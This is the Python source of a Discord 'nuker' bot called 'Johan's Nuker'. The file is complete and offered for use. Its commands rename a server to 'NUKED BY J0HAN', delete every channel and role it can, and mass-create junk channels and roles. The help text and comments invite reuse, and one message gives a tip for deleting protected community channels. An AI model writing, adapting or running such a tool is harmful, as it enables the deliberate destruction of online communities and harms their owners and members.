
# Developed by J0HAN

import discord, asyncio
from colorama import Fore

# Set-up
print(Fore.WHITE)
try:
    with open("config.txt") as file:
        token = file.readline()
        prefix = file.readline()
except:
    print(Fore.RED + "Error: Check your 'config.txt' file for any mistakes")

if prefix == "":
    print(Fore.YELLOW + "Warning: Your prefix is set as whitespace")

client = discord.Client(intents=discord.Intents.all())

print(Fore.BLACK)

# Main
@client.event
async def on_ready():
    print(Fore.WHITE + f"User: {client.user}")
    print(f"Prefix: {prefix}")

@client.event
async def on_message(message):
    msg = message.content
    if msg.startswith(f"{prefix}help"):
        print(Fore.GREEN + f"\n'{prefix}help' command used!")
        try:
            await message.reply(f"""💥 **Johan's Nuker**
                                Revamped help menu soon that'll be an embed!
                                **Commands:**
                                * {prefix}nuke - Automatic nuke
                                * {prefix}del - Deletes all channels & roles
                                * {prefix}cdel - Deletes all channels
                                * {prefix}rdel - Deletes all roles
                                * {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
                                * {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want
                                """)
        except:
            print(Fore.YELLOW + f"Warning: '{prefix}help' command unsuccessfully ran")
        
    async def del_channels():
        print(Fore.WHITE + "\nDeleting all the channels...")
        for channel in message.guild.channels:
            try:
                await channel.delete()
                print(Fore.GREEN + "Channel deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete channel.")
        print(Fore.WHITE + "All channels that can be deleted have been deleted. Tip: disable community to delete the rules and community updates channels.")
    
    async def del_roles():
        print(Fore.WHITE + "\nDeleting all the roles...")
        for role in message.guild.roles:
            try:
                await role.delete()
                print(Fore.GREEN + f"Role deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete role.")
        print(Fore.WHITE + "All roles that can be deleted have been deleted.")
    
    async def mass_channels(amount, channel_name):
        print(Fore.WHITE + "\nMass channel creation is in progress...")
        channels_made = 0
        while int(channels_made) < int(amount):
            try:
                await message.guild.create_text_channel(channel_name)
                channels_made += 1
                print(Fore.GREEN + "Text channel created!")
            except:
                print(Fore.YELLOW + "Unable to create text channel.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass channel creation has been finished!")

    async def mass_roles(amount, role_name):
        print(Fore.WHITE + "\nMass role creation is in progress...")
        roles_made = 0
        while int(roles_made) < int(amount):
            try:
                await message.guild.create_role(name=role_name)
                roles_made += 1
                print(Fore.GREEN + "Role has been created!")
            except:
                print(Fore.YELLOW + "Unable to create role.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass role creation has been finished!")

    # Commands (feel free to rename)
    if msg.startswith(f"{prefix}nuke"):
        await message.guild.edit(name="NUKED BY J0HAN")
        await del_channels()
        await del_roles()
        await mass_channels(5, "johan-was-here")
        await mass_roles(5, "J0HAN WAS HERE")
        print(Fore.GREEN + "\nNuke has been finished!")

    if msg.startswith(f"{prefix}del"):
        await del_channels()
        await del_roles()
        print(Fore.GREEN + "Deletion of channels & roles has been complete!")
    
    if msg.startswith(f"{prefix}cdel"):
        await del_channels()

    if msg.startswith(f"{prefix}rdel"):
        await del_roles()

    if msg.startswith(f"{prefix}channels"):
        command = msg.split(" ")
        await mass_channels(command[1], command[2])

    if msg.startswith(f"{prefix}roles"):
        command = msg.split(" ")
        await mass_roles(command[1], command[2])

client.run(token)
